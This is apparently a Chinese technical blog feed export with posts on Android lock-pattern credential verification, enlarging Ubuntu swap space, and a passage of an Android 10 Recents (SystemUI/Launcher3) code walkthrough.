class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">UnlockPatternListener</span> <span class="keyword">implements</span> <span class="title class_">LockPatternView</span>.OnPatternListener &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPatternDetected</span><span class="params">(<span class="keyword">final</span> List&lt;LockPatternView.Cell&gt; pattern)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;onPatternDetected&quot;</span>);</span><br><span class="line">        mKeyguardUpdateMonitor.setCredentialAttempted();</span><br><span class="line">        mLockPatternView.disableInput();</span><br><span class="line">        <span class="keyword">if</span> (mPendingLockCheck != <span class="literal">null</span>) &#123;</span><br><span class="line">            mPendingLockCheck.cancel(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> KeyguardUpdateMonitor.getCurrentUser();</span><br><span class="line">        <span class="keyword">if</span> (pattern.size() &lt; LockPatternUtils.MIN_PATTERN_REGISTER_FAIL) &#123;</span><br><span class="line">            mLockPatternView.enableInput();</span><br><span class="line">            onPatternChecked(userId, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">false</span> <span class="comment">/* not valid - too short */</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (LatencyTracker.isEnabled(mContext)) &#123;</span><br><span class="line">            LatencyTracker.getInstance(mContext).onActionStart(ACTION_CHECK_CREDENTIAL);</span><br><span class="line">            LatencyTracker.getInstance(mContext).onActionStart(ACTION_CHECK_CREDENTIAL_UNLOCKED);</span><br><span class="line">        &#125;</span><br><span class="line">        mPendingLockCheck = LockPatternChecker.checkCredential(</span><br><span class="line">                mLockPatternUtils,</span><br><span class="line">                LockscreenCredential.createPattern(pattern),    <span class="comment">// 这里跟进去，会发现将 pattern转化成了 byte[]</span></span><br><span class="line">                userId,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LockPatternChecker</span>.OnCheckCallback() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEarlyMatched</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;onEarlyMatched&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (LatencyTracker.isEnabled(mContext)) &#123;</span><br><span class="line">                            LatencyTracker.getInstance(mContext).onActionEnd(</span><br><span class="line">                                    ACTION_CHECK_CREDENTIAL);</span><br><span class="line">                        &#125;</span><br><span class="line">                        onPatternChecked(userId, <span class="literal">true</span> <span class="comment">/* matched */</span>, <span class="number">0</span> <span class="comment">/* timeoutMs */</span>,</span><br><span class="line">                                <span class="literal">true</span> <span class="comment">/* isValidPattern */</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChecked</span><span class="params">(<span class="type">boolean</span> matched, <span class="type">int</span> timeoutMs)</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;onChecked matched:&quot;</span> + matched);</span><br><span class="line">                        <span class="keyword">if</span> (LatencyTracker.isEnabled(mContext)) &#123;</span><br><span class="line">                            LatencyTracker.getInstance(mContext).onActionEnd(</span><br><span class="line">                                    ACTION_CHECK_CREDENTIAL_UNLOCKED);</span><br><span class="line">                        &#125;</span><br><span class="line">                        mLockPatternView.enableInput();</span><br><span class="line">                        mPendingLockCheck = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (!matched) &#123;</span><br><span class="line">                            onPatternChecked(userId, <span class="literal">false</span> <span class="comment">/* matched */</span>, timeoutMs,</span><br><span class="line">                                    <span class="literal">true</span> <span class="comment">/* isValidPattern */</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCancelled</span><span class="params">()</span> &#123;</span><br><span class="line">                       <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;onCancelled&quot;</span>);</span><br><span class="line">                        <span class="comment">// We already got dismissed with the early matched callback, so we</span></span><br><span class="line">                        <span class="comment">// cancelled the check. However, we still need to note down the latency.</span></span><br><span class="line">                        <span class="keyword">if</span> (LatencyTracker.isEnabled(mContext)) &#123;</span><br><span class="line">                            LatencyTracker.getInstance(mContext).onActionEnd(</span><br><span class="line">                                    ACTION_CHECK_CREDENTIAL_UNLOCKED);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">if</span> (pattern.size() &gt; MIN_PATTERN_BEFORE_POKE_WAKELOCK) &#123;</span><br><span class="line">            mCallback.userActivity();</span><br><span class="line">            mCallback.onUserInput();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在绘制密码后手指抬起的时候，如果已存的有效点数达到4个及以上，就会使用LockPatternChecker.checkCredential 方法调用 task.execute() 启动一个AsyncTask， 并在doInBackground中调用LockPatternUtils.checkCredential 进行密码验证，此时pattern会被转化成字节形式（LockscreenCredential.createPattern(pattern)  这里跟进去，会发现将 pattern转化成了 byte[]）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LockPatternUtils.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] patternToByteArray(List&lt;LockPatternView.Cell&gt; pattern) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pattern == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">patternSize</span> <span class="operator">=</span> pattern.size();</span><br><span class="line">    <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[patternSize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; patternSize; i++) &#123;</span><br><span class="line">        LockPatternView.<span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> pattern.get(i);</span><br><span class="line">        res[i] = (<span class="type">byte</span>) (cell.getRow() * <span class="number">3</span> + cell.getColumn() + <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终和密码锁PIN码锁一样，都是远程调用到LockSettingsService 的 checkCredential 接口进行验证。<br>Keyguard接收用户输入的密码会通过Binder到framework层的LockSettingsService，LockSettingsService经过一系列调用会通过getGateKeeperService获取GateKeeperService然后调用verifyChallenge方法将密码继续忘底层传递，framework的调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Throwab</span><br><span class="line">comandroid.locksettings.1locksettings.LockSettingsService. spBasedDoVerifyCredential(LockSettingsService. java:2724)COT3767075server.ocksettingsLockSettingsService.doVerifyCredentia1(LockSettingsSeryice.java:2020comandroservercom android.server.locksettings.LockSettingsService.doVerifyCredential(LockSettingsService. jaya:1999atcom android.server.locksettings.LockSettingsService. checkCredential(LockSettingsService. java:1972)com android.internal.widget.ILockSettings$Stub.onTransact(ILockSettings.java:542atatexecTransactInternal(Binder.java:1159)execTransact(Binder.java:1123)at</span><br><span class="line"> SyntheticPasswordllanager. unwrapPasswordBasedSyntheticPassword(SyntheticPasswordllanager. java: 1016</span><br><span class="line">android.os.Binderandroid.os.Binder</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu修改Swap交换空间大小</title>
      <link href="/2023/12/03/2023-12-03/"/>
      <url>/2023/12/03/2023-12-03/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>安装Ubuntu系统时，选择了默认空间分配方案，Swap空间仅1G，而实际的物理内存有32G，分给Swap空间至少为内存的1倍，最好是内存值的2倍，系统相当卡顿，重做系统后，费力部署的环境怎么又需要重新部署，头痛！</p><h3 id="一、查看本机Swap交换空间的内存大小"><a href="#一、查看本机Swap交换空间的内存大小" class="headerlink" title="一、查看本机Swap交换空间的内存大小"></a>一、查看本机Swap交换空间的内存大小</h3><p>命令如下<br><strong>free -m</strong><br>执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ free -m</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:          31995         374       30603           9        1016       31142</span><br><span class="line">Swap:           976          65         911</span><br></pre></td></tr></table></figure><p>可以看到本机的Swap空间为976M左右，即1G空间。</p><p>下面我们将其扩大64G</p><h3 id="二、创建Swap文件"><a href="#二、创建Swap文件" class="headerlink" title="二、创建Swap文件"></a>二、创建Swap文件</h3><p><strong>sudo -i</strong><br>输入密码后，切换root。</p><p><strong>mkdir /swap</strong><br>建立swap文件夹</p><p><strong>cd /swap/</strong><br>进入到swap文件夹</p><p><strong>sudo dd if=/dev/zero of=swapfile bs=64M count=1k</strong><br>建立swapfile，大小为bs*count = 64M * 1k = 64G</p><p><strong>sudo mkswap -f swapfile</strong><br>将生成的文件转换为Swap文件<br>执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ sudo -i</span><br><span class="line">[sudo] longzhiye 的密码： </span><br><span class="line">root@longzhiye-laptop:~<span class="comment"># cd /</span></span><br><span class="line">root@longzhiye-laptop:/<span class="comment"># mkdir /swap</span></span><br><span class="line">root@longzhiye-laptop:/<span class="comment"># cd swap/</span></span><br><span class="line">root@longzhiye-laptop:/swap<span class="comment"># sudo dd if=/dev/zero of=swapfile bs=64M count=1k</span></span><br><span class="line">记录了1024+0 的读入</span><br><span class="line">记录了1024+0 的写出</span><br><span class="line">68719476736 bytes (69 GB, 64 GiB) copied, 276.311 s, 249 MB/s</span><br><span class="line">root@longzhiye-laptop:/swap<span class="comment"># sudo mkswap -f swapfile</span></span><br><span class="line">Setting up swapspace version 1, size = 64 GiB (68719472640 bytes)</span><br><span class="line">无标签， UUID=c7feaf13-7f02-4941-a07f-86a43bdf3ef5</span><br></pre></td></tr></table></figure><h3 id="三、激活Swap文件"><a href="#三、激活Swap文件" class="headerlink" title="三、激活Swap文件"></a>三、激活Swap文件</h3><p><strong>sudo swapon swapfile</strong><br><strong>free -m</strong><br>激活Swap文件，并重新查看Swap空间 内存<br>执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@longzhiye-laptop:/swap<span class="comment"># sudo swapon swapfile</span></span><br><span class="line">swapon: /swap/swapfile：不安全的权限 0644，建议使用 0600。</span><br><span class="line">root@longzhiye-laptop:/swap<span class="comment"># free -m</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:          31995         381         374           9       31238       31065</span><br><span class="line">Swap:         66512          64       66448</span><br></pre></td></tr></table></figure><p>可以看到Swap空间内存从1G变为64G = 我们扩大的64G+原始的1G。</p><h3 id="四、设置为永久Swap"><a href="#四、设置为永久Swap" class="headerlink" title="四、设置为永久Swap"></a>四、设置为永久Swap</h3><p>未做此步骤，重启之前的设置都失效！！！！<br><strong>sudo gedit /etc/fstab</strong><br>更改swap路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/fstab: static file system information.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use &#x27;blkid&#x27; to print the universally unique identifier for a</span></span><br><span class="line"><span class="comment"># device; this may be used with UUID= as a more robust way to name devices</span></span><br><span class="line"><span class="comment"># that works even if disks are added and removed. See fstab(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span></span><br><span class="line"><span class="comment"># / was on /dev/sda2 during installation</span></span><br><span class="line">UUID=b726da21-83a0-497b-b3eb-a09f16403d60 /               ext4    errors=remount-ro 0       1</span><br><span class="line"><span class="comment"># /boot/efi was on /dev/sda1 during installation</span></span><br><span class="line">UUID=C0BE-3630  /boot/efi       vfat    <span class="built_in">umask</span>=0077      0       1</span><br><span class="line"><span class="comment">#UUID=c7bb6d12-b247-4119-9c27-797f9995884e none            swap    sw              0       0</span></span><br><span class="line">/swap/swapfile            swap            swap    sw              0       0</span><br></pre></td></tr></table></figure><h3 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h3><p>如果需要卸载这个 swap 文件，可以进入建立的 swap 文件目录。执行下列命令。<br><strong>sudo swapoff swapfile</strong><br>如果需要一直保持这个 swap ，可以把它写入 /etc/fstab 文件。<br><strong>/swap/swapfile /swap swap defaults 0 0</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android10.0 最近任务Recents功能分析</title>
      <link href="/2023/12/02/2023-12-02/"/>
      <url>/2023/12/02/2023-12-02/</url>
      
        <content type="html"><![CDATA[<p>在Android10.0上，Recents功能分布在SystemUI和Launcher3里面集成.</p><h3 id="一-初始化"><a href="#一-初始化" class="headerlink" title="一.初始化"></a>一.初始化</h3><p>跟Android8.1类似，先看初始化入口：</p><h4 id="1-Recents-java"><a href="#1-Recents-java" class="headerlink" title="1.Recents.java"></a>1.Recents.java</h4><p>Recents继承SystemUI，进程启动后会在Dependency里面通过@Inject进行初始化，然后在SystemUIService里面调用SystemUIApplication的startServicesIfNeeded()里面进行启动：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/recents/Recents.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> RecentsImplementation mImpl</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//加入callback</span></span><br><span class="line">    mCommandQueue.addCallback(<span class="built_in">this</span>);</span><br><span class="line">    mImpl.onStart(mContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RecentsImplementation替代了之前的RecentsImpl，是一个interface，由其实现类OverviewProxyRecentsImpl来执行操作，关于该类的实例化用到了dagger2，不懂的同学可以去学习一下；</p><h4 id="2-OverviewProxyRecentsImpl-java"><a href="#2-OverviewProxyRecentsImpl-java" class="headerlink" title="2.OverviewProxyRecentsImpl.java"></a>2.OverviewProxyRecentsImpl.java</h4><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/recents/OverviewProxyService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> OverviewProxyService mOverviewProxyService;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">   </span><br><span class="line">    mOverviewProxyService = Dependency.get(OverviewProxyService.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据调用关系，在onStart()里面创建了OverviewProxyService对象，看一下具体实现：</p><h4 id="3-OverviewProxyService-java"><a href="#3-OverviewProxyService-java" class="headerlink" title="3.OverviewProxyService.java"></a>3.OverviewProxyService.java</h4><p>中间类，在该类内部去绑定远端的service：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/recents/OverviewProxyService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">OverviewProxyService</span><span class="params">(Context context, CommandQueue commandQueue,</span></span><br><span class="line"><span class="params">            NavigationBarController navBarController, NavigationModeController navModeController,</span></span><br><span class="line"><span class="params">            NotificationShadeWindowController statusBarWinController, SysUiState sysUiState,</span></span><br><span class="line"><span class="params">            PipUI pipUI, Optional&lt;Divider&gt; dividerOptional,</span></span><br><span class="line"><span class="params">            Optional&lt;Lazy&lt;StatusBar&gt;&gt; statusBarOptionalLazy,</span></span><br><span class="line"><span class="params">            BroadcastDispatcher broadcastDispatcher)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(broadcastDispatcher);</span><br><span class="line">    mRecentsComponentName = ComponentName.unflattenFromString(context.getString(</span><br><span class="line">            com.android.internal.R.string.config_recentsComponentName));</span><br><span class="line">    mQuickStepIntent = <span class="keyword">new</span> <span class="title class_">Intent</span>(ACTION_QUICKSTEP)</span><br><span class="line">            .setPackage(mRecentsComponentName.getPackageName());</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// Connect to the service</span></span><br><span class="line">    updateEnabledState();</span><br><span class="line">    startConnectionToCurrentUser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startConnectionToCurrentUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mHandler.getLooper() != Looper.myLooper()) &#123;</span><br><span class="line">        mHandler.post(mConnectionRunnable);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        internalConnectToCurrentUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalConnectToCurrentUser</span><span class="params">()</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">Intent</span> <span class="variable">launcherServiceIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(ACTION_QUICKSTEP)</span><br><span class="line">                .setPackage(mRecentsComponentName.getPackageName());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mBound = mContext.bindServiceAsUser(launcherServiceIntent,</span><br><span class="line">                    mOverviewServiceConnection,</span><br><span class="line">                    Context.BIND_AUTO_CREATE | Context.BIND_FOREGROUND_SERVICE_WHILE_AWAKE,</span><br><span class="line">                    UserHandle.of(getCurrentUserId()));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> IOverviewProxy mOverviewProxy;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ServiceConnection</span> <span class="variable">mOverviewServiceConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">      </span><br><span class="line">        mOverviewProxy = IOverviewProxy.Stub.asInterface(service);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟随调用关系来看，在构造方法内部，会去执行startConnectionToCurrentUser来调用bindServiceAsUser()去启动service，在onServiceConnected中，通过IOverviewProxy.Stub.asInterface(service)来获取IOverviewProxy实例，后续会用到；<br>Service对应的Intent为android.intent.action.QUICKSTEP_SERVICE，R.string.config_recentsComponentName对应如下，用来获取远端服务的应用包名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;string name=<span class="string">&quot;config_recentsComponentName&quot;</span> translatable=<span class="string">&quot;false&quot;</span></span><br><span class="line">        &gt;com.android.launcher3/com.android.quickstep.RecentsActivity&lt;/string&gt;</span><br></pre></td></tr></table></figure><p>从ComponentName可以看到，被bind的service是在Launcher3里面，接下来一起看一下对应的远端Service；</p><h4 id="4-TouchInteractionService-java"><a href="#4-TouchInteractionService-java" class="headerlink" title="4.TouchInteractionService.java"></a>4.TouchInteractionService.java</h4><p><strong>packages/apps/Launcher3/quickstep/recents_ui_overrides/src/com/android/quickstep/TouchInteractionService.java</strong><br>Launcher3内的入口类，通过该类来调用相关逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">IBinder</span> <span class="variable">mMyBinder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IOverviewProxy</span>.Stub() &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@BinderThread</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOverviewToggle</span><span class="params">()</span> &#123;</span><br><span class="line">        mOverviewCommandHelper.onOverviewToggle();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mMyBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，TouchInteractionService里面创建了IOverviewProxy.Stub实例，然后在onBind()返回；<br>TouchInteractionService是一个Service，在onCreate()里面进行了一些初始化相关的调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate();</span><br><span class="line">   </span><br><span class="line">    mDeviceState.runOnUserUnlocked(<span class="built_in">this</span>::onUserUnlocked);</span><br><span class="line">   </span><br><span class="line">    sConnected = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@UiThread</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUserUnlocked</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    mOverviewComponentObserver = <span class="keyword">new</span> <span class="title class_">OverviewComponentObserver</span>(<span class="built_in">this</span>, mDeviceState);</span><br><span class="line">    mOverviewCommandHelper = <span class="keyword">new</span> <span class="title class_">OverviewCommandHelper</span>(<span class="built_in">this</span>, mDeviceState,</span><br><span class="line">                mOverviewComponentObserver);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在TouchInteractionService启动后，会创建OverviewComponentObserver实例和OverviewCommandHelper实例，一起看一下这两个类的实现：</p><h4 id="5-OverviewComponentObserver-java"><a href="#5-OverviewComponentObserver-java" class="headerlink" title="5.OverviewComponentObserver.java"></a>5.OverviewComponentObserver.java</h4><p><strong>packages/apps/Launcher3/quickstep/src/com/android/quickstep/OverviewComponentObserver.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">OverviewComponentObserver</span><span class="params">(Context context, RecentsAnimationDeviceState deviceState)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">fallbackComponent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(mContext, RecentsActivity.class);</span><br><span class="line">    mFallbackIntent = <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_MAIN)</span><br><span class="line">                .addCategory(Intent.CATEGORY_DEFAULT)</span><br><span class="line">                .setComponent(fallbackComponent)</span><br><span class="line">                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">    </span><br><span class="line">    updateOverviewTargets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在构造方法内部会创建mFallbackIntent，从组成来看，通过该Intent启动RecentsActivity；接下来看一下 updateOverviewTargets()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateOverviewTargets</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    mActivityInterface = FallbackActivityInterface.INSTANCE;</span><br><span class="line">    